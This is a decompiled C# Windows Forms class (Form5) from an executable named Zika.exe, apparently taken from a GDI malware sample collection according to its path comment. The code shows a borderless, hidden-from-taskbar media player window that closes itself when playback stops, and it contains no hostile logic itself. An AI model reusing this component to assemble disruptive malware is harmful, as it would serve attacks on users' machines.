// Decompiled with JetBrains decompiler
// Type: Zika.Form5
// Assembly: Zika, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7CE6D81-E560-4B98-8463-4AED586D3B4E
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\GDI\Zika\Zika.exe

using AxWMPLib;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

#nullable disable
namespace Zika;

public class Form5 : Form
{
  private IContainer components;
  private AxWindowsMediaPlayer axWindowsMediaPlayer1;

  public Form5() => this.InitializeComponent();

  private void Form5_Load(object sender, EventArgs e)
  {
  }

  private void axWindowsMediaPlayer1_Enter(object sender, EventArgs e)
  {
  }

  private void axWindowsMediaPlayer1_PlayStateChange(
    object sender,
    _WMPOCXEvents_PlayStateChangeEvent e)
  {
    if (this.axWindowsMediaPlayer1.playState != 1)
      return;
    this.Close();
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form5));
    this.axWindowsMediaPlayer1 = new AxWindowsMediaPlayer();
    ((ISupportInitialize) this.axWindowsMediaPlayer1).BeginInit();
    this.SuspendLayout();
    ((Control) this.axWindowsMediaPlayer1).Dock = DockStyle.Fill;
    ((AxHost) this.axWindowsMediaPlayer1).Enabled = true;
    ((Control) this.axWindowsMediaPlayer1).Location = new Point(0, 0);
    ((Control) this.axWindowsMediaPlayer1).Name = "axWindowsMediaPlayer1";
    ((AxHost) this.axWindowsMediaPlayer1).OcxState = (AxHost.State) componentResourceManager.GetObject("axWindowsMediaPlayer1.OcxState");
    ((Control) this.axWindowsMediaPlayer1).Size = new Size(284, 261);
    ((Control) this.axWindowsMediaPlayer1).TabIndex = 0;
    this.axWindowsMediaPlayer1.PlayStateChange += new _WMPOCXEvents_PlayStateChangeEventHandler(this.axWindowsMediaPlayer1_PlayStateChange);
    ((Control) this.axWindowsMediaPlayer1).Enter += new EventHandler(this.axWindowsMediaPlayer1_Enter);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.Black;
    this.ClientSize = new Size(284, 261);
    this.Controls.Add((Control) this.axWindowsMediaPlayer1);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Name = nameof (Form5);
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = nameof (Form5);
    this.Load += new EventHandler(this.Form5_Load);
    ((ISupportInitialize) this.axWindowsMediaPlayer1).EndInit();
    this.ResumeLayout(false);
  }
}
